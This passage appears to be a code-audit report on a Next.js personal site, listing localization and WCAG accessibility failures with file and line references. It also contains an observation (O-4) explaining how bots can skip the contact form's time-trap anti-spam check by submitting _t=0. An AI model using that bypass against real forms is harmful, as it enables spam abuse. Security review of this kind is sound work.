  - 6 binary `lang === "fa" ? ... : ...` ternaries with NO
    German translation: page.tsx:352, 457, 702, 703, 707,
    791. German UI falls back to English for these strings.
  - Missing content.ts UI schema entries for: clips section
    (title, subtitle, eyebrow, emptyState), contact form
    robot-check label, contact form robot-check error.
  - All aria-labels and tooltip titles for theme/lang/nav
    toggles are English-only.

Verdict: PARTIAL FAIL — the page relies heavily on `tt.*`
  and `tx()` for localization, but 6 inline ternaries miss
  German entirely, and 4 UI sections (clips, robot-check
  label, anti-theft warning, domain-lock message) bypass
  the localization system. The dead footer-admin link
  (page.tsx:823-830) is a separate functional bug.


10. Accessibility?  [PARTIAL FAIL — multiple WCAG gaps]
----------------------------------------------------------------
What's done well:
  - Form labels properly associated via htmlFor/id:
    page.tsx:779 (name) ↔ 780, 783 (email) ↔ 784, 787
    (message) ↔ 788. ✅
  - Form status uses `role="status"` (page.tsx:807). ✅
  - reCAPTCHA gated by `mounted` to avoid hydration
    mismatch (page.tsx:794) — comment explains why.
  - WaveDivider SVG has `aria-hidden="true"` (page.tsx:
    412). ✅
  - Anti-clone watermark has `aria-hidden="true"` (page.
    tsx:422). ✅
  - Honeypot field has `aria-hidden="true"` + tabIndex=-1
    (page.tsx:771, 774). ✅
  - prefers-reduced-motion respected (personal.css:1395-
    1401, 1463, 3487). ✅
  - :focus-visible outline (personal.css:1402-1405). ✅
  - Iframe has `title` attribute (page.tsx:871). ✅
  - Lang-toggle buttons have aria-label (page.tsx:528). ✅
  - Nav-toggle has aria-label (page.tsx:536). ✅
  - To-top button has aria-label={tt.toTop} (page.tsx:837).
    ✅
  - ESC closes modal (page.tsx:310-318). ✅
  - Body scroll lock when menu/modal open (page.tsx:290-
    293). ✅
  - `<html lang>` and `dir` synced (page.tsx:110-113). ✅

What's missing or broken:
  (a) NO skip-to-content link anywhere in src/app/page.tsx
      or layout.tsx (verified by Grep for "skip-to-content",
      "skip-link", "skip-nav" — 0 matches). Keyboard users
      must tab through the entire statusbar + navbar + nav-
      links before reaching main content. WCAG 2.1 SC 2.4.1
      Bypass Blocks violation.
  (b) Theme-switcher buttons (page.tsx:514-520) have NO
      aria-label — only `title` (which is unreliable for
      screen readers). The inner `<span class="theme-icon">`
      colored dot has no text. Screen reader users hear
      "button, button, button, button, button, button,
      button" with no way to distinguish themes. Also no
      aria-pressed to indicate the active theme. WCAG 2.1
      SC 4.1.2 Name, Role, Value violation.
  (c) Lang-toggle buttons (page.tsx:523-532) have
      aria-label but NO aria-pressed — active language is
      not announced. Same violation.
  (d) Nav-toggle hamburger (page.tsx:534-540) has
      aria-label but NO aria-expanded — screen readers
      can't tell whether the mobile menu is open or closed.
      WCAG 2.1 SC 4.1.2 violation.
  (e) Tutorial modal (page.tsx:843-878):
      - NO `role="dialog"` on the modal container (line 845).
      - NO `aria-modal="true"`.
      - NO `aria-labelledby` pointing to the modal title
        span (line 848-850). The title span has no id.
      - NO focus trap — Tab can escape to background
        content behind the modal. Keyboard users get
        lost.
      - NO focus restore — when the modal closes, focus
        is not returned to the clicked tutorial card.
        Keyboard users lose their place in the tutorial
        list.
      - NO initial focus management — when the modal
        opens, focus stays on the clicked card, not moved
        into the modal. Screen readers may not announce
        the modal opened.
      WCAG 2.1 SC 2.4.3 Focus Order + SC 4.1.2 violations.
  (f) Footer admin link (page.tsx:823-830) is a dead
      `<a>` with no href and no onClick — keyboard
      activation does nothing. The Ctrl+Shift+A shortcut
      advertised in the title attribute is NOT implemented.
      WCAG 2.1 SC 2.1.1 Keyboard violation.
  (g) Anti-theft warning (page.tsx:427-438): rendered
      when DevTools detected. Not focusable, not
      dismissible via keyboard. If a screen reader user
      has DevTools open, this warning appears but cannot
      be acknowledged. (Acceptable since the warning is
      an anti-theft measure aimed at sighted inspection.)
  (h) Statusbar (page.tsx:441-465): RF decoration with
      no semantic markup. The `<span className="value">`
      tags are not associated with their `<span
      className="label">` tags via any ARIA. Decorative
      use is acceptable, but if the time display is
      meaningful, it should have a more semantic structure.
  (i) Form `<form noValidate>` (page.tsx:766): disables
      browser-native validation. JS handles validation
      via `tt.contact.form.errors.*` strings (page.tsx:
      330-347). Works for mouse + keyboard users, but
      users with JS disabled see no validation at all.
      Acceptable trade-off for a JS-heavy app.
  (j) ReCAPTCHA label (page.tsx:791): `<label>` without
      htmlFor. The g-recaptcha div (page.tsx:796) has no
      id. The label is not programmatically associated
      with the widget. Minor — reCAPTCHA manages its own
      a11y internally.
  (k) Color-only active state for theme buttons (personal.
      css:2079-2083: active = green background). Color
      alone does not convey state to colorblind users.
      Should be paired with an icon or shape change.
      WCAG 2.1 SC 1.4.1 Use of Color concern.

Verdict: PARTIAL FAIL — basic form a11y is solid (labels,
  role=status, aria-hidden on decorative elements, focus-
  visible). But 5 distinct WCAG violations exist: (a) no
  skip-to-content link, (b-d) toggle buttons missing
  aria-pressed / aria-expanded, (e) modal missing role/
  aria-modal/aria-labelledby + no focus trap + no focus
  restore, (f) dead footer-admin link, (k) color-only
  active state.

O-4. Time-trap bypass for pre-useEffect submissions:
     src/app/page.tsx:80 `useState(0)` initial value. Between
     first paint and useEffect firing (~16ms), formLoadTime=0,
     hidden input renders `_t="0"`. Page.tsx:369 fallback `"0"
     || Date.now()` returns "0". API at api/contact/route.ts:
     89-93 does `Number("0") = 0`, then `if (submittedAt && ...)`
     short-circuits → time-trap skipped. Bots that submit
     before useEffect OR that POST directly to /api/contact
     with `_t=0` (or omitting `_t`) bypass the time-trap.
     Pre-existing design limitation, not a V17.4 regression.

     useContent.ts:30 initial state has `navItems: []`. Until

     hardcoded nav (page.tsx:502-509) flashes briefly. Same
     happens on every language toggle because useContent.ts:
     38-39 wipes localStorage cache before re-fetching.
     Recommend: cache navItems in localStorage (or sessionStorage)
     with TTL; hydrate synchronously from cache before fetch.

O-12. Anti-theft warning not keyboard-dismissible:
     page.tsx:427-438 — renders when DevTools detected. The
